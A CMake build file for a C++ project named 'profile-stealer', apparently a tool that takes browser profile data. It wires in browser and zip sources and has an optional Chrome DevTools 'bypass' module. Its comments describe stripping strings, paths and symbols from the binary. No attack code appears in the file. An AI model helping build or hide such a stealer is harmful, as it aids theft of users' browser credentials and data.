cmake_minimum_required(VERSION 3.16)
project(profile-stealer LANGUAGES C CXX)

# ─────────────────────────────────────────────
# Default to Release so NDEBUG is defined
# (NDEBUG disables assert() -> removes assert strings + __FILE__ paths)
# ─────────────────────────────────────────────
if(NOT CMAKE_BUILD_TYPE AND NOT CMAKE_CONFIGURATION_TYPES)
    set(CMAKE_BUILD_TYPE Release CACHE STRING "" FORCE)
endif()

# ─────────────────────────────────────────────
# C++ standard
# ─────────────────────────────────────────────
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

if (MSVC)
    add_compile_options(/Zc:preprocessor)
    set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded")
endif()

# ─────────────────────────────────────────────
# Fetch CLI11 (header-only)
# ─────────────────────────────────────────────
include(FetchContent)
FetchContent_Declare(
    cli11
    GIT_REPOSITORY https://github.com/CLIUtils/CLI11.git
    GIT_TAG        v2.4.2
    GIT_SHALLOW    TRUE
)
FetchContent_MakeAvailable(cli11)

# ─────────────────────────────────────────────
# Sources
# ─────────────────────────────────────────────
add_executable(${PROJECT_NAME}
    src/main.cpp
)
target_sources(${PROJECT_NAME} PRIVATE
    src/manager/manager.cpp
    src/browsers/browsers.cpp
    imports/miniz/miniz.c
)
# CDP minimal sources (exclude the library's own main.cpp)
# ─────────────────────────────────────────────
# Include directories (always needed)
# ─────────────────────────────────────────────
target_include_directories(${PROJECT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/src
)

# ─────────────────────────────────────────────
# Optional CDP minimal (only when bypass method == cdp)
# ─────────────────────────────────────────────
option(ENABLE_CDP "Enable cdp_minimal sources + headers (required for cdp bypass)" OFF)

if(ENABLE_CDP)
    # CDP minimal sources (exclude the library's own main.cpp)
    file(GLOB CDP_SOURCES
        "imports/cdp_minimal/src/cdp/*.cpp"
        "imports/cdp_minimal/src/detail/*.cpp"
    )
    list(FILTER CDP_SOURCES EXCLUDE REGEX ".*[/\\]main\\.cpp$")
    target_sources(${PROJECT_NAME} PRIVATE ${CDP_SOURCES})

    target_include_directories(${PROJECT_NAME} PRIVATE
        ${CMAKE_CURRENT_SOURCE_DIR}/imports/cdp_minimal/include
    )
endif()

# ─────────────────────────────────────────────
# Include directories
# ─────────────────────────────────────────────
target_include_directories(${PROJECT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/imports/cdp_minimal/include
)

# ─────────────────────────────────────────────
# Link libraries
# ─────────────────────────────────────────────
target_link_libraries(${PROJECT_NAME} PRIVATE CLI11::CLI11)

# ─────────────────────────────────────────────
# Static-string / size reduction
# ─────────────────────────────────────────────
target_compile_options(${PROJECT_NAME} PRIVATE
    # split funcs/data into own sections so the linker can drop unused ones
    $<$<CXX_COMPILER_ID:GNU,Clang,AppleClang>:-ffunction-sections;-fdata-sections>
    # scrub absolute build paths out of __FILE__ / assert / debug info
    $<$<CXX_COMPILER_ID:GNU,Clang,AppleClang>:-ffile-prefix-map=${CMAKE_SOURCE_DIR}=.>
    # no RTTI -> removes typeid() name strings  (C++ only; drop if you use dynamic_cast/typeid)
    $<$<AND:$<COMPILE_LANGUAGE:CXX>,$<CXX_COMPILER_ID:GNU,Clang,AppleClang>>:-fno-rtti>
    $<$<AND:$<COMPILE_LANGUAGE:CXX>,$<CXX_COMPILER_ID:MSVC>>:/GR->
    # MSVC: pool identical string literals
    $<$<CXX_COMPILER_ID:MSVC>:/GF>
)

target_link_options(${PROJECT_NAME} PRIVATE
    # drop unreferenced sections (kills strings from unused cdp_minimal code)
    $<$<CXX_COMPILER_ID:GNU,Clang>:-Wl,--gc-sections>
    $<$<CXX_COMPILER_ID:AppleClang>:-Wl,-dead_strip>
    $<$<CXX_COMPILER_ID:MSVC>:/OPT:REF;/OPT:ICF>
    # strip the symbol table in Release (symbol names are strings too)
    $<$<AND:$<CONFIG:Release>,$<CXX_COMPILER_ID:GNU,Clang,AppleClang>>:-Wl,-s>
)

# LTO in Release: lets the linker prove more code dead -> more strings removed
include(CheckIPOSupported)
check_ipo_supported(RESULT _ipo_ok OUTPUT _ipo_msg)
if(_ipo_ok)
    set_target_properties(${PROJECT_NAME} PROPERTIES
        INTERPROCEDURAL_OPTIMIZATION_RELEASE TRUE
    )
endif()

# ─────────────────────────────────────────────
# Platform-specific settings
# ─────────────────────────────────────────────
if(WIN32)
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        PLATFORM_WINDOWS
        _CRT_SECURE_NO_WARNINGS
        NOMINMAX
        WIN32_LEAN_AND_MEAN
    )

elseif(APPLE)
    target_compile_definitions(${PROJECT_NAME} PRIVATE PLATFORM_MACOS)
elseif(UNIX)
    target_compile_definitions(${PROJECT_NAME} PRIVATE PLATFORM_LINUX)
endif()

# ─────────────────────────────────────────────
# Output directory
# ─────────────────────────────────────────────
set_target_properties(${PROJECT_NAME} PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
)